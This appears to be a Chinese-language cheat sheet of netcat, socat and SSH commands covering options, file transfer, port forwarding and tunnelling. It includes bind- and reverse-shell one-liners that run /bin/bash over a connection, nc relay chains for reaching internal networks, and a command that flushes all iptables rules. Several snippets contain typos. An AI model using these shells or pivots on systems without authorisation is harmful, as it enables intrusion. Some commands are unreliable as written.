## Netcat(NC)

支持TCP，UDP，大部分协议，部分版本支持隧道模式

### 通用参数解析

-b <=> --bind 绑定指定网卡

-l <=> --listen 监听模式

-p <=> --port 指定监听端口 

-n <=> --numeric 显示数字地址而不是主机名 （客户端使用表示不进行DNS查询）

-v <=> --verbose 显示详细的连接信息

-z <=> --zeal 仅发送Syn包并等待回应，端口扫描

-u <=> --udp 使用udp协议

-w <=> --wait 设置超时时间（秒）

-c <=> --shell command（命令行映射）

-s <=> --source-port 指定发送数据时的源端口

-e <=> --exec 在连接建立后执行命令

-i <=> --interactive 在执行-e选项时，保持交互式界面

-h <=> --help 获取帮助输入

-t<=> --telnet -t 模式

### 客户端

默认模式： nc xxx.com <port>

### 服务端

默认参数：nc -l <port>

### 正常shell

nc -l -p <port> -v -e '/bin/bash'

nc -v <ip> <port> 

### 反弹shell (Reverse Shell)

nc -l -p <port> -v 

nc -v <ip> <port> -e '/bin/bash'

### 传输文件

1.客户端发送

nc -l -p <port>  < 1.txt

nc 127.0.0.1 <port> > 1.txt

2.客户端接收

nc -l -p <port> > 1.txt

nc -nv 127.0.0.1 <port> < 1.txt

### 邮箱客户端协议

nc -nv x.x.x.x 110

账号：USER 

密码：PASS

邮件列表：LIST

查看指定邮件：RETR

退出：quit

### 隧道模式（端口转发 穿透内网）

本机 localHost

远程主机 remoteHost

中间主机 middlehost

##### 正向隧道

remoteHost Server:127.0.0.1 1201  <bash>

middleHost  Server:127.0.0.1 1200 -> 1201

localHost  Cient:127.0.0.1 1201

 

nc -lvvp 1201 -e '/bin/bash'

nc -lvvp 1200 -c 'nc -vv 127.0.0.1 1201'

nc  -vv 127.0.0.1 1200

##### 反向隧道

remoteHost Server:127.0.0.1 1201 

middleHost  Server:127.0.0.1 1200 -> 1201

localHost  Cient:127.0.0.1 1201 <bash>

 

nc -lvvp 1201

nc -lvvp 1200 -c 'nc -vv 127.0.0.1 1201'

nc  -vv 127.0.0.1 1200 -e '/bin/bash'





##### 双向隧道

## Socat

Socat来源Socket Cat，多功能网络协议工具，可以像cat命令处理Socket数据流。

主要功能：数据转发，网络连接，流量重定向，数据转换，代理功能

### 语法

socat [options] <address> <address>

TCP-LISTEN:8080,frok ：表示监听TCP 8080端口，并为每个连接创建分支进程。

### 参数

-d <-> --debug 增加调试信息输出

-v <-> --verbose 增加输出的详细程度

-t <-> --timeout 设置超时时间

-TCP-LISTEN:<port>,[options] 监听TCP端口

-TCP:<host><port> 连接指定TCP主机

-UNIX-LISTEN:<path>,[options] 监听UNIX域套接字

-UNIX:<path> 连接到UNIX域

-EXEC:<command> 执行命令，标准输入输出作为数据通道

-PEPE 使用通道

-FILE <filename> 使用文件作为数据通道

-PTY 创建伪终端

-resolve  解析地址

-waitport <port> 等待端口可用后连接

-reuseaddr 启用端口重用机制

-connect-timeout <seconds> 超时（秒）

-retries <retryCount> 重试

-interface <network> 绑定网络接口

-h 获取帮助

### 用法示例

#### 监听shell

socat TCP-LISTEN:<port>,fork EXEC:‘/bin/bash’

socat TCP:<add>:<port> -e

#### 反弹shell

socat TCP-LISTEN:<port>,fork

socat TCP:<add>:<port>,EXEC:’/bin/bash‘

#### 端口转发 （LCL,CLC）

客户端 LISTEN<->CLIENT<->LISTEN

socat TCP:<addr1><port1> TCP:<addr2>:<port2>

服务端 CLIENT<->LISTEN<->LISTEN

socat TCP-LISTEN:<port1>,reuseaddr,fork TCP:<addr2>:<port2>

#### 启用SSL-TLS加密

socat TCP:<addr1>:<port1>,cert=xxx.pem,key=xxx.pem

#### 启用代理服务器

socat -PROXY:http=<addr>:<port>

socat -PROXY:socks5=<addr>:<port>

### SSH

#### 相关命令

查看SSH服务状态

sudo systemctl status ssh

启动SSH服务

sudo systemctl start ssh

停止SSH服务

sudo systemctl stop ssh

关闭所有ssh所有隧道

pkill -c 'ssh -fN' 

#### 选项

-L <=> Listen 监听模式

-R <=> Remote 远程模

-D <=> Dynamic 动态模式

-N 不执行远程命令，只建隧道

-f 后台运行



#### 隧道模式（SSH Tunnel）

核心作用：SSH 连接本身是加密的，你可以用它作为“隧道”，将其他协议的流量“塞进去”传输。这样，即使在公共 Wi-Fi 上，也能安全访问远程服务。

1.先检查SSH服务状态，启动服务

2.添加隧道

ssh -fN -L <listenPort>:<RemoteAddr>:<RemotePort>: <user>@<hostName or hostAddr>

注意检查防火墙状态：

##### ufw

查看UFW状态

sudo ufw status numbered

删除UFW规则

sudo ufw delete <number>

##### iptables

删除所有防火墙规则

sudo iptables -F

sudo iptables -t net -F
